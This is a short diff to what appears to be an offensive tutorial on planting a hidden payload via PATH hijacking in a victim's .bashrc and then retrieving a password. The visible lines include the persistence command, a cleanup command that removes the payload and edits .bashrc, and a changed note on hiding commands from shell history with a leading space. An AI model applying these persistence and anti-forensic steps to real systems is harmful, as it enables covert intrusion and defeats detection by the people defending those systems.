@@ -29,7 +29,7 @@ victim@server:~$ echo 'export PATH="$HOME/.payload:$PATH"' >> $HOME/.bashrc
 ```
 victim@server:~$ rm -rf $HOME/.payload; rm /tmp/.temp5678; sed '/export PATH="$HOME\/\.payload:$PATH"/d' .bashrc > tmp && mv tmp .bashrc
 ```
-*Note: Running `history` will reveal the cleanup command*
+*Note: If the HISTCONTROL environment variable is set to "ignorespace" or "ignoreboth", adding a space before the command will prevent it from showing up when running `history`.*
 
 ##### Retrieve the password
 ```
